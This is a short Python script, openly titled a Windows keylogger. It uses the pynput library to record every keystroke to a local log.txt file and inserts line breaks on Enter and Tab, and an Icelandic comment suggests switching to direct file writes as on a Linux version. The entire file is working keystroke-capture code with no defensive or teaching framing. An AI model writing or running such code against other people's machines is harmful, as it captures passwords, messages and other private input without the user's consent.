###################################
# Keylogger to be used in Windows #
###################################
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

# Sennilega best að fjarlægja "logging" dæmið alveg og nota
# file write statements eftir open() eins og linux meginn.
logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(message)s')

def on_press(key):
    if(str(key) == "Key.enter" or str(key) == "Key.tab"):
        logging.info(str(key) + '\n')
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
